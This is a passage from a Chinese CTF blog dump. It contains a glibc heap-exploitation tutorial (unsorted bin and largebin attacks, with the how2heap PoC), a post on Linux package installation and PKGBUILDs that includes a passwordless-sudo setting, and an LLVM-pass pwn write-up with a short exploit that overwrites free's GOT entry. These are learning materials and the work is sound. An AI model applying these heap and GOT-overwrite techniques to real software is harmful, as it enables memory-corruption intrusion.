((unsigned long) size== (unsigned long) chunksize_nomask (fwd))                /* Always insert in the second position.  */                fwd = fwd-&gt;fd;              else                &#123;                  victim-&gt;fd_nextsize = fwd;                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                  fwd-&gt;bk_nextsize = victim;                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                 &#125;              bck = fwd-&gt;bk;            &#125;        &#125;      else        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;\n\n其实很明显的可以看出来下面仍然存在相应的漏洞\nvictim-&gt;fd_nextsize = fwd;victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; \n\nunsorted bin attack在这里说一下unsorted bin attack，虽然在2.29出来之后基本就没法利用了但是害怕题目出的libc版本在以往的版本然后又限制大小所以这里还是提一下unsorted bin attack\n这里就不提出全部源码就把存在漏洞的两行提出来：\nunsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);\n\n可以看出来如果我们可以控制unsorted_chunks (av)的bk指针，那就可以向任意地址写入堆地址了。\n这里直接给出how2heap当中的poc吧：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    printf(&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stackn&quot;);    printf(&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;           &quot;global variable global_max_fast in libc for further fastbin attacknn&quot;);    unsigned long stack_var=0;    printf(&quot;Let&#x27;s first look at the target we want to rewrite on stack:n&quot;);    printf(&quot;%p: %ldnn&quot;, &amp;stack_var, stack_var);    unsigned long *p=malloc(400);    printf(&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;,p);    printf(&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;           &quot;the first one during the free()nn&quot;);    malloc(500);    free(p);    printf(&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;           &quot;point to %pn&quot;,(void*)p[1]);    //------------VULNERABILITY-----------    p[1]=(unsigned long)(&amp;stack_var-2);    printf(&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointern&quot;);    printf(&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn&quot;,(void*)p[1]);    //------------------------------------    malloc(400);    printf(&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been &quot;           &quot;rewrite:n&quot;);    printf(&quot;%p: %pn&quot;, &amp;stack_var, (void*)stack_var);&#125;\n\n写的很详细，如果看不懂可以-g编译调试一下。\nGlibc2.31下的largebin attack先看一下源码：\nif (fwd != bck)&#123;    /* Or with inuse bit to speed comparisons */    size |= PREV_INUSE;    /* if smaller than smallest, bypass loop below */    assert (chunk_main_arena (bck-&gt;bk));    if ((unsigned long) (size)        &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))    &#123;        fwd = bck;        bck = bck-&gt;bk;        victim-&gt;fd_nextsize = fwd-&gt;fd;        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    &#125;    else    &#123;        assert (chunk_main_arena (fwd));        while ((unsigned long) size &lt; chunksize_nomask (fwd))        &#123;            fwd = fwd-&gt;fd_nextsize;            assert (chunk_main_arena (fwd));        &#125;        if ((unsigned long) size            == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;        else        &#123;            victim-&gt;fd_nextsize = fwd;            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;            if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);            fwd-&gt;bk_nextsize = victim;            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        &#125;        bck = fwd-&gt;bk;        if (bck-&gt;fd != fwd)            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);    &#125;&#125;else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;\n\n这里可以看到西面我们以前利用的地方都加上了检查，导致我们没法再从这个地方出发利用了，但是上面是没有任何保护的。\nif ((unsigned long) (size)    &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;    fwd = bck;    bck = bck-&gt;bk;    victim-&gt;fd_nextsize = fwd-&gt;fd;    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;\n\n其实根据上面几个版本的glibc来看这里的利用思路其实是挺明显的，我们只需要修改fwd-&gt;fd-&gt;bk_nextsize也能实现上面的操作。\n比如，现在存在一个已经在large bin 当中的chunk1：\nsize = 0x460&#123;    fd = largebin(index); // 其实在最上面的图能够看出来这里其实保存的是largebin当中相应的位置    bk = largebin(index);    fd_nextsize = 0;    bk_nextsize = target-0x20;&#125;\n\n还有一个即将放入large bin当中的chunk2：\nsize = 0x450&#123;    fd = 0;    bk = 0;    fd_nextsize = 0;    bk_nextsize = 0;&#125;\n\n可以看到将上面的翻译下来其实就是\nchunk2-&gt;fd_nextsize = largebin(index);chunk2-&gt;bk_nextsize = largebin(index)-&gt;bk_nextsize;// 这里的largebin一定存放的是chunk1所以后面的表达式等价于chunk1-&gt;bk_nextsize也就是target-0x20*(target-0x20)-&gt;fd_nextsize = chunk2;// 前面的那个不需要管\n\n这样也就同样实现了任意地址写上堆地址。\n任意地址写上堆地址的利用方式很多，比如VN那道题为FSOP做铺垫，或则修改global_max_fast的值到一个很大的值，为fastbin attack做铺垫，一般来说这种攻击手法都是为其他的攻击手法做铺垫的。\n\n参考链接：\nhttps://www.anquanke.com/post/id/244018\n","categories":["pwn"],"tags":["largebin attack"]},{"title":"linux软件安装时到底在做什么?","url":"/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/","content":"除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。\n依赖linux的依赖问题一直是被人诟病的，尤其是debian系的(arch系我感觉几乎没遇到过依赖问题)，在进行安装的总是会出来这个套那个，导致我以前使用ubuntu时安装一个程序可能得花上一下午的时间，而且几乎全部时间都在解决依赖问题。\n那么问题来了，依赖到底是什么？\n首先需要说明的是windows和linux其实都是存在依赖问题的，比如我以前在windows虚拟机里面运行ida的时候就会出现依赖问题，不过网上都有现成的包直接安装就好。虽然按理来说linux也存在依赖的包，但是为什么linux的依赖问题会比windows更加经常发生呢？\n举个例子：现在运行一个程序需要依赖a-1，我使用windows找到了这个依赖的安装包，实际上这个安装包安装下来的是a-1,a-2,,,,a-30。但是纯纯的linux只会帮你安装a-1，下一次遇到需要a-12的时候，windows不会报错但是linux又需要安装另外版本的依赖了。\n上面的看过了之后就大概对linux的依赖问题有一定了解了，那么为了更好的了解依赖问题我们首先需要知道\n安装一个包的过程\n首先可以看到linux和window的不同，linux的安装包是真的非常单纯的压缩整合到一起，最后由包管理器将不同功能的文件放到不同目录。\n在上面这张图里面我们需要重点关注的data.tar.xz\n\n查看其内部可以发现就是一个usr目录\n\n这里就是我们熟悉的desktop，也就是桌面图标\n\n可以看到bin目录是一个链接符号\ntcdy@archlinux /mnt/5F2601400CC8834D/save/usr/bin % ls -l typora lrwxrwxrwx 1 root root 22 Apr  7 10:51 typora -&gt; ../share/typora/Typora\n\n可以看到就是链接到了一个可执行文件，当我们双击文件就可以打开typora了。\n找到可执行程序之后只需要使用ldd即可查看需要的依赖\ntcdy@archlinux ..5F2601400CC8834D/save/usr/share/typora % ldd Typora \tlinux-vdso.so.1 (0x00007ffe581fd000)\tlibffmpeg.so =&gt; /mnt/5F2601400CC8834D/save/usr/share/typora/./libffmpeg.so (0x00007fefa6baa000)\tlibdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fefa6b7e000)\tlibpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fefa6b79000)\tlibgobject-2.0.so.0 =&gt; /usr/lib/libgobject-2.0.so.0 (0x00007fefa6b1a000)\tlibglib-2.0.so.0 =&gt; /usr/lib/libglib-2.0.so.0 (0x00007fefa69dc000)\tlibxshmfence.so.1 =&gt; /usr/lib/libxshmfence.so.1 (0x00007fefa69d7000)\tlibgio-2.0.so.0 =&gt; /usr/lib/libgio-2.0.so.0 (0x00007fefa6807000)\tlibnss3.so =&gt; /usr/lib/libnss3.so (0x00007fefa66d4000)\tlibnssutil3.so =&gt; /usr/lib/libnssutil3.so (0x00007fefa66a1000)\tlibsmime3.so =&gt; /usr/lib/libsmime3.so (0x00007fefa6678000)\tlibnspr4.so =&gt; /usr/lib/libnspr4.so (0x00007fefa6636000)\tlibatk-1.0.so.0 =&gt; /usr/lib/libatk-1.0.so.0 (0x00007fefa660c000)\tlibatk-bridge-2.0.so.0 =&gt; /usr/lib/libatk-bridge-2.0.so.0 (0x00007fefa65d4000)\tlibdbus-1.so.3 =&gt; /usr/lib/libdbus-1.so.3 (0x00007fefa6581000)\t......\n\n可以看到这里甚至于有依赖就在当前目录寻找了\n\n可以看到这里的文件其实也就包含了上面所需要的一部分依赖，其实这也是很多windows程序的思路，如果程序存在很多不常见到的依赖就会把依赖和程序捆绑起来进行安装。\n其实到这里大家都大概知道了包管理器在安装程序时到底是干了什么，其实就是将不同功能的程序放进了不同目录。\nAUR-PKGBUILD的编写一样拿typora举例\n# Maintainer: Jonas Bögle &lt;aur@iwr.sh&gt;# Contributor: Jonathan Duck &lt;duckbrain30@gmail.com&gt;_pkgname=typorapkgname=&quot;$_pkgname-free&quot;pkgver=0.11.18pkgrel=2pkgdesc=&quot;A minimal markdown editor and reader.&quot;arch=(&#x27;x86_64&#x27;)filename=&quot;typora_$&#123;pkgver&#125;_amd64.deb&quot;license=(&#x27;custom:&quot;Copyright (c) 2015 Abner Lee All Rights Reserved.&quot;&#x27;)url=&quot;https://typora.io/&quot;depends=(&#x27;gtk3&#x27; &#x27;libxss&#x27;)optdepends=(\t&#x27;noto-fonts-emoji: Or some other emoji font to see emojis&#x27;\t&#x27;pandoc: Import/export for extra file formats&#x27;)provides=(&quot;$_pkgname&quot;)conflicts=(&quot;$_pkgname&quot;)source=(&quot;https://typora.io/linux/$filename&quot;)sha512sums=(&#x27;8933cb4eab13a37719a3771d14a7a3f5951f6bbce06381ffe37ad5bc3029efed3878723427a4e97b83dbc1d7ccc43b31551b0c336663c843f0e685f8a4e2390e&#x27;)package() &#123;\tbsdtar -xf data.tar.xz -C &quot;$pkgdir/&quot;\trm -rf &quot;$pkgdir/usr/share/lintian/&quot;\tchmod 4755 &quot;$pkgdir/usr/share/typora/chrome-sandbox&quot;\t# Remove write permission for group/other\tchmod -R go-w &quot;$pkgdir/usr/share/typora/resources/node_modules&quot;\tsed -i &#x27;/Change Log/d&#x27; &quot;$pkgdir/usr/share/applications/typora.desktop&quot;\tfind &quot;$pkgdir&quot; -type d -exec chmod 755 &#123;&#125; \\;&#125;\n\n上面的名字，版本，架构什么就不说了，主要关注下面的内容。\n首先是这里source，很明显就是再往上的这个文件的deb包，下面sha512sums就是检验码。\nsrcdir\n​    makepkg将会把源文件解压到此文件夹或在此文件夹中生成指向 PKGBUILD 里 source 数组中文件的软连接。\npkgdir\n​    makepkg会把该文件夹当成系统根目录，并将软件安装在此文件夹下。\n重点就是下面的打包函数，可以看到首先是解压了data.tar.xz这个包带pkgdir。后面就是删除个东西，然后改变权限(可以看到typora是Electron)，下面就是创建图标，最后就是修改pkgdir下目录的权限为755。\n关于aur的更多可以看archwiki\nsudo免密码这个是我每次装完系统必干的一件事情，不过经常忘，而且网上的很多东西都不能实现。所以这里自己记录一下\nroot ALL=(ALL:ALL) ALLyour_username ALL=(ALL) NOPASSWD: ALL\n\n删除/etc/sudoers.d/10-installer\n总结其实程序的安装并没有我以前想象的那么复杂，至少对于linux来说是这样的。如果遇到什么有趣的linux操作我也会及时分享。\n","categories":["搞机"],"tags":["deb","aur"]},{"title":"llvm pass pwn","url":"/2022/07/27/llvm-pass-pwn/","content":"简要介绍首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：\nLLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本。\nLLVM PASS是什么：pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果\n\n首先我们的源代码会被clang编译器编译成一种中间代码——IR，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。\nLLVM IRLLVM的IR的三种存在形式：\n\n内存格式，只保存在内存中，人无法看到\n不可读的IR，被称作bitcode，文件后缀为bc\n可读的IR，介于高级语言和汇编代码之间，文件后缀为ll\n\n大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。\n从对应格式转化到另一格式的命令：\n.c  =&gt; .ll: clang -emit-llvm -S a.c -o a.ll.c  =&gt; .bc: clang -emit-llvm -c a.c -o a.bc.ll =&gt; .bc: llvm-as a.ll -o a.bc.bc =&gt; .ll: llvm-dis a.bc -o a.ll.bc =&gt; .s : llc a.bc -o a.s\n\n首先呢，写一个简单的c语言程序：\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;   char name[0x10];   read(0,name,0x10);   write(1,name,0x10);   printf(&quot;wow\\n&quot;);&#125;\n\n通过上面所给的指令\nclang -emit-llvm -S test.c -o test.ll\n\n获得如下内容：\n; ModuleID = &#x27;test.c&#x27;target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;target triple = &quot;x86_64-pc-linux-gnu&quot;@.str = private unnamed_addr constant [5 x i8] c&quot;wow\\0A\\00&quot;, align 1; Function Attrs: nounwind uwtabledefine i32 @main() #0 &#123;  %name = alloca [16 x i8], align 16  %1 = getelementptr inbounds [16 x i8], [16 x i8]* %name, i32 0, i32 0  %2 = call i64 @read(i32 0, i8* %1, i64 16)  %3 = getelementptr inbounds [16 x i8], [16 x i8]* %name, i32 0, i32 0  %4 = call i64 @write(i32 1, i8* %3, i64 16)  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0))  ret i32 0&#125;declare i64 @read(i32, i8*, i64) #1declare i64 @write(i32, i8*, i64) #1declare i32 @printf(i8*, ...) #1attributes #0 = &#123; nounwind uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;attributes #1 = &#123; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;!llvm.ident = !&#123;!0&#125;!0 = !&#123;!&quot;clang version 3.8.0-2ubuntu4 (tags/RELEASE_380/final)&quot;&#125;\n\n可以看见中间无论是申请变量还是调用函数还是可以很清晰的看出来的。\nLLVM PASS官方文档的一个实例：\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());  &#125;);\n\n该示例用于遍历IR中的函数，因此结构体Hello继承了FunctionPass，并重写了runOnFunction函数，那么每遍历到一个函数时，runOnFunction都会被调用，因此该程序会输出函数名。我们需要将其编译为模块\nclang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared test.cpp -o test.so `llvm-config --ldflags`\n\ntcdy@ubuntu:~$ opt -load ./test.so -hello ./test.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: main\n\n上面以我们刚刚的IR为例，-hellow是注册的名字\nstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);\n\n最后打印出来函数名字\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();      for(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)&#123;         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();         for(; instIter != instEnd; ++instIter)&#123;            errs() &lt;&lt; &quot;opcode=&quot; &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; &quot; NumOperands=&quot; &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; &quot;\\n&quot;;         &#125;      &#125;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());&#125;);\n\n现在在刚刚的基础上对函数的代码进行遍历操作\ntcdy@ubuntu:~$ opt -load ./test.so -hello ./test.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: mainopcode=alloca NumOperands=1opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=call NumOperands=2opcode=ret NumOperands=1\n\n最后可以看到拿到了函数中的指令操作\nLLVM PASS逆向分析一般来说LLVM PASS pwn都是对函数进行PASS操作，所以我们首先要找到runOnFunction函数时如何重写的\n\n一般来说runOnFunction都会在函数表的最下面\n2021 redhat simpleVM首先找到上面所述的函数：\n__int64 __fastcall sub_6830(__int64 a1, llvm::Value *a2)&#123;  __int64 v2; // rdx  bool v4; // [rsp+7h] [rbp-119h]  size_t v5; // [rsp+10h] [rbp-110h]  const void *Name; // [rsp+28h] [rbp-F8h]  __int64 v7; // [rsp+30h] [rbp-F0h]  int v8; // [rsp+94h] [rbp-8Ch]  Name = (const void *)llvm::Value::getName(a2);  v7 = v2;  if ( &quot;o0o0o0o0&quot; )    v5 = strlen(&quot;o0o0o0o0&quot;);  else    v5 = 0LL;  v4 = 0;  if ( v7 == v5 )  &#123;    if ( v5 )      v8 = memcmp(Name, &quot;o0o0o0o0&quot;, v5);    else      v8 = 0;    v4 = v8 == 0;  &#125;  if ( v4 )    sub_6AC0(a1, a2);  return 0LL;&#125;\n\n可以看到这里验证的是函数名是否为o0o0o0o0然后进入：\nunsigned __int64 __fastcall sub_6AC0(__int64 a1, llvm::Function *a2)&#123;  llvm::BasicBlock *v3; // [rsp+20h] [rbp-30h]  __int64 v4; // [rsp+38h] [rbp-18h] BYREF  __int64 v5[2]; // [rsp+40h] [rbp-10h] BYREF  v5[1] = __readfsqword(0x28u);  v5[0] = llvm::Function::begin(a2);  while ( 1 )  &#123;    v4 = llvm::Function::end(a2);    if ( (llvm::operator!=(v5, &amp;v4) &amp; 1) == 0 )      break;    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);    sub_6B80(a1, v3);    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator++(      v5,      0LL);  &#125;  return __readfsqword(0x28u);&#125;\n\n这里则是遍历函数中的每一个basicblock，取出之后进入sub_6b80函数进一步处理\nv39[1] = __readfsqword(0x28u);v39[0] = llvm::BasicBlock::begin(a2);while ( 1 )&#123;    v38 = llvm::BasicBlock::end(a2);    if ( (llvm::operator!=(v39, &amp;v38) &amp; 1) == 0 )        break;    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,false&gt;&gt;(v39);    if ( (unsigned int)llvm::Instruction::getOpcode(v36) == 0x37 )    &#123;        v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);        if ( v35 )        &#123;            s1 = (char *)malloc(0x20uLL);            CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);            Name = (_QWORD *)llvm::Value::getName(CalledFunction);            *(_QWORD *)s1 = *Name;            *((_QWORD *)s1 + 1) = Name[1];            *((_QWORD *)s1 + 2) = Name[2];            *((_QWORD *)s1 + 3) = Name[3];\n\n这里呢则是遍历basicblock中的每一个操作指令，后续就是类似于vm-pwn中对相应的指令做相应的处理。这里重点关注三段代码即可：\nelse if ( !strcmp(s1, &quot;store&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )    &#123;        v25 = llvm::CallBase::getArgOperand(v35, 0);        v24 = 0LL;        v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);        if ( v23 )        &#123;            v22 = llvm::ConstantInt::getZExtValue(v23);            if ( v22 == 1 )                v24 = REG1;            if ( v22 == 2 )                v24 = REG2;        &#125;        if ( v24 == REG1 )        &#123;            **(_QWORD **)REG1 = *(_QWORD *)REG2;        &#125;        else if ( v24 == REG2 )        &#123;            **(_QWORD **)REG2 = *(_QWORD *)REG1;        &#125;    &#125;&#125;\n\n这里可以看到指令为store时，通过第一个参数来决定下面是什么寄存器来进行赋值，如果我们可以操控寄存器也就可以实现任意地址写了。\nelse if ( !strcmp(s1, &quot;load&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )    &#123;        v21 = llvm::CallBase::getArgOperand(v35, 0);        v20 = 0LL;        v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);        if ( v19 )        &#123;            v18 = llvm::ConstantInt::getZExtValue(v19);            if ( v18 == 1 )                v20 = REG1;            if ( v18 == 2 )                v20 = REG2;        &#125;        if ( v20 == REG1 )            *(_QWORD *)REG2 = **(_QWORD **)REG1;        if ( v20 == REG2 )            *(_QWORD *)REG1 = **(_QWORD **)REG2;    &#125;&#125;\n\n根据上面同理，如果可以操控寄存器就可以任意地址读了\nelse if ( !strcmp(s1, &quot;add&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )    &#123;        v17 = llvm::CallBase::getArgOperand(v35, 0);        v16 = 0LL;        v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);        if ( v15 )        &#123;            v14 = llvm::ConstantInt::getZExtValue(v15);            if ( v14 == 1 )                v16 = REG1;            if ( v14 == 2 )                v16 = REG2;        &#125;        if ( v16 )        &#123;            v13 = llvm::CallBase::getArgOperand(v35, 1u);            v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);            if ( v12 )                *v16 += llvm::ConstantInt::getZExtValue(v12);        &#125;    &#125;&#125;\n\n这里我们就可以控制寄存器了\n可以在上面看到，这里的指令是放在malloc出来的堆块上面的，并且程序的循环最后会free掉堆块，那么我们的思路就是修改free的got表为one_gadget\nexp:\nvoid store(int a);void load(int a);void add(int a, int b); void o0o0o0o0()&#123;    add(1, 0x77e100);    load(1);    add(2, 0x729ec);    store(1);&#125;\n\nSatool## IntroductionA LLVM Pass that can optimize add/sub instructions.## How to runopt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S## Example### IR before optimization```define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;  %2 = sub nsw i64 %0, 2  %3 = add nsw i64 %2, 68  %4 = add nsw i64 %0, 6  %5 = add nsw i64 %4, -204  %6 = add nsw i64 %5, %3  ret i64 %6&#125;```### IR after optimization```define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;  %2 = mul i64 %0, 2  %3 = add i64 %2, -132  ret i64 %3&#125;```\n\n首先看题目的readme文件，可以从before和after的对比看出来这里做的是压缩优化IR指令，并且限制了只能是sub或者add或者ret\n\n可以看到这道题的runOnFunction更是直接给了出来\nv30 = this;v29 = a2;v28 = 0;v2 = a2;if ( llvm::Function::arg_size(a2) != 1 || (v2 = v29, llvm::Function::size(v29) != 1) )&#123;    v3 = llvm::errs(v2);    llvm::raw_ostream::operator&lt;&lt;(v3, &quot;Function has more than one argument or basicblock\\n&quot;);    exit(-1);&#125;this[5] = this[4];mprotect(this[4], 0x1000uLL, 3);`anonymous namespace&#x27;::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);    mprotect(this[4], 0x1000uLL, 5);v27 = `anonymous namespace&#x27;::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);\n\n可以看到函数的开始验证了参数和基本块只允许有一个，然后通过handle函数之后执行callCode函数，并且在handle处理之前内存的权限为可读可写，随后改为了可读可执行。\n__int64 __fastcall `anonymous namespace&#x27;::MBAPass::callCode(        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),        __int64 a2)&#123;  return this[4]((_anonymous_namespace_::MBAPass *)this, a2);&#125;\n\n可以看到callCode函数是将this[4]直接执行，那么意思很明显就是写shellcode。所以重点还是需要看handle函数\nv32 = this;v31 = a2;v30 = *((_QWORD *)this + 4) + 0xFF0LL;v29 = (llvm::BasicBlock *)llvm::Function::front(a2);Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);Operand = llvm::User::getOperand(Terminator, 0);if ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; 1) != 0 )&#123;    *((_DWORD *)this + 12) = 0;    v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);    SExtValue = llvm::ConstantInt::getSExtValue(v2);    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, SExtValue);        return `anonymous namespace&#x27;::MBAPass::writeRet(this);&#125;else if ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;((__int64)&amp;Operand) &amp; 1) != 0 )&#123;    *((_DWORD *)this + 12) = 1;    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, 0LL);        return `anonymous namespace&#x27;::MBAPass::writeRet(this);&#125;else&#123;    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, 0LL);        *((_DWORD *)this + 12) = 0;    std::stack&lt;llvm::Value *&gt;::stack&lt;std::deque&lt;llvm::Value *&gt;,void&gt;(v26);    